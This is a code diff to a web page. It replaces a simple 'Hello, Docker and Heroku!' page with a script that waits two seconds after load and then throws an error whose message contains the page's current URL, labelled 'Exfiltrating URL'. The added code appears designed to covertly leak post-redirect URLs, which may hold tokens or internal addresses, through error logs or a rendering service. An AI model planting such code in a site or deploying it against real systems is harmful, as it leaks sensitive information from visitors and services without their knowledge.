@@ -1,12 +1,12 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dockerized Python Server on Heroku</title>
-</head>
+<html>
 <body>
-    <h1>Hello, Docker and Heroku!</h1>
-    <p>This page is served by a Dockerized Python http.server on Heroku.</p>
+<script>
+    window.onload = function() {
+        setTimeout(() => {
+            // This will cause an error, and the error message will contain the current URL
+            throw new Error("Exfiltrating URL: " + window.location.href);
+        }, 2000); // Wait for 2 seconds to ensure any redirects have completed
+    };
+</script>
 </body>
 </html>
